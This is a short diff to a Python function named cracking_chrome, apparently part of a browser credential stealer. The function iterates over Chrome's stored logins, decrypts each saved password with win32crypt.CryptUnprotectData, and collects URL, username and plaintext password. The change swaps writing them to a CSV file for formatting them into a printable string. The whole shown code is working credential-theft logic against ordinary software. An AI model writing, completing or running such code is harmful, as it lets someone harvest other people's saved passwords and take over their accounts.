@@ -17,9 +17,8 @@ def cracking_chrome():
     for url, user_name, pwd in login_data:
         pwd = win32crypt.CryptUnprotectData(pwd)
         cred[url] = (user_name, pwd[1].decode('utf8'))
-        generate_csv(url, user_name, pwd[1].decode('utf8'))
-        #string = f"\n[*] URL: {url} Username: {user_name} Password: {pwd[1].decode('utf8')}"
-
+        #generate_csv(url, user_name, pwd[1].decode('utf8'))
+        string = f"\n[*] URL: {url} Username: {user_name} Password: {pwd[1].decode('utf8')}"
 
 
 def generate_csv(url, username, password):
